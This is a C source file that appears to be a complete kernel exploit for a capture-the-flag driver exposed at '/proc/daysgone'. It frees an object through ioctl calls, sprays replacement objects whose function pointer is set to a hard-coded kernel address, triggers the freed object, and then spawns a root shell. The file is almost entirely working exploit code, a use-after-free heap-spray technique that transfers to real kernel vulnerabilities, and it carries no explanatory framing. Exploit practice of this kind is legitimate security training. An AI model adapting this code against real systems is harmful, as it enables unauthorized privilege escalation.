#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

#define VULN_DEV "/proc/daysgone"
#define WEAPON_SELECT 0x102
#define WEAPON_CRAFT 0x100
#define WEAPON_FREE 0x101
#define WEAPON_CUSTOM 0x104
#define NEXT_DAY 0x105
#define WEAPON_SHOOT 0x103

int devfd;

typedef struct {
	char name[0x18];
	unsigned long damage;
	unsigned long durability;
	unsigned long pad;
	void *attack_func;
}kweapon_t;



int open_device(char *file, int flags){
	int fd;

	if ((fd = open(file, flags)) < 0 ){
		printf("[!] Error opening device.\n");
		exit(1);
	}

	return fd;
}

int main(){

	devfd = open_device(VULN_DEV, O_RDWR);

	printf("[*] Opened device!\n");

	unsigned long win = 0xffff800008e5c39c;

	kweapon_t weapon = {0};

	int idx[100];

	long i = 0;

	ioctl(devfd, WEAPON_CRAFT, &i);
	ioctl(devfd, WEAPON_SELECT, &i);
	ioctl(devfd, WEAPON_FREE, &i);
	
	strncpy(weapon.name, "AAAAAAAA", 0x11);
	weapon.damage = 0x30;
	weapon.durability = 0x30;
	weapon.pad = 0x0;
	weapon.attack_func = (void *)win;

	for(int i = 0; i < 100; i++){
		ioctl(devfd, WEAPON_CUSTOM, &weapon);
	}

	ioctl(devfd, WEAPON_SHOOT, &i);

	system("/bin/sh -c 'echo win > /win.txt' ");
	system("/bin/sh");
	return 0;
}